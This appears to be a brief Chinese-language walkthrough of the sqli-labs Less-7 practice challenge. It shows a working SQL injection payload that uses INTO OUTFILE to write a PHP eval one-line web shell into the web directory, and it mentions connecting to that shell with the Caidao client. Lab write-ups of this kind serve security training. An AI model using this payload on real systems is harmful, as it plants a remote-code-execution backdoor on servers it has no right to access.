提示使用out_file判断需要文件操作。

直接写入一句话木马。

```javascript
?id=1'))union select 1,2,
'<?php @eval($_post["mima"])?>' into outfile 
"H:\\WWW\\sql-labs\\Less-7\\shell.php"--+
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/9D03E338CFB24C4FB10B6D9BFF587CD6clipboard.png)

虽然提示报错，但是木马已经写入成功了。使用菜刀 访问文件即可。

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/61112A8499AB4AE1B8D5EBAC1EFE7179clipboard.png)



这里有个需要注意的点id的参数需要使用括号闭合。而且还是两个😶。

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/D6829ABF769A486382E740F2D4B59673clipboard.png)

